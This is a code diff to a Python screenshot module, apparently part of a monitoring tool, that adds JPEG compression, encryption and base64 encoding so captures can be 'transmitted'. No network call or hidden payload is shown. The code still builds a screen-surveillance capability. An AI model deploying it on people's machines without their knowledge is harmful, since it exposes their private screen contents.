@@ -1,14 +1,17 @@
 """
-Screenshot Module - Fixed version
-Handles screenshot capture and automatic screenshots
+Screenshot Module - Enhanced with encryption
+Handles screenshot capture and automatic screenshots with secure transmission
 """
 import os
 import time
+import base64
+import io
 from datetime import datetime
 from PIL import ImageGrab
 
 from .config import SCREENSHOTS_DIR, config
 from .monitoring import get_monitoring_status, get_last_activity
+from .encryption import encryption_manager
 
 # Global state
 screenshot_history = []
@@ -16,8 +19,8 @@ last_screenshot_time = None
 auto_screenshot_enabled = False
 auto_screenshot_interval = 300
 
-def take_screenshot():
-    """Capture and save screenshot"""
+def take_screenshot(encrypt=True, quality=85):
+    """Capture and save screenshot with optional encryption"""
     try:
         screenshot = ImageGrab.grab()
         
@@ -25,13 +28,37 @@ def take_screenshot():
         filename = f"screenshot_{timestamp}.png"
         filepath = SCREENSHOTS_DIR / filename
         
+        # Save original screenshot
         screenshot.save(filepath, "PNG")
         
-        screenshot_history.append({
+        # Create screenshot data for transmission
+        img_buffer = io.BytesIO()
+        screenshot.save(img_buffer, format='JPEG', quality=quality, optimize=True)
+        img_data = img_buffer.getvalue()
+        
+        # Encrypt screenshot data if enabled
+        encrypted_data = None
+        if encrypt:
+            encryption_result = encryption_manager.encrypt_screenshot(img_data)
+            if encryption_result['success']:
+                encrypted_data = encryption_result['data']
+        
+        screenshot_entry = {
             "filename": filename,
             "timestamp": datetime.now().isoformat(),
-            "path": str(filepath)
-        })
+            "path": str(filepath),
+            "size": len(img_data),
+            "encrypted": encrypt and encrypted_data is not None,
+            "quality": quality
+        }
+        
+        if encrypted_data:
+            screenshot_entry["encrypted_data"] = encrypted_data
+        else:
+            # Store base64 encoded data for transmission
+            screenshot_entry["data"] = base64.b64encode(img_data).decode('utf-8')
+        
+        screenshot_history.append(screenshot_entry)
         
         # Keep only last 100 screenshots
         if len(screenshot_history) > 100:
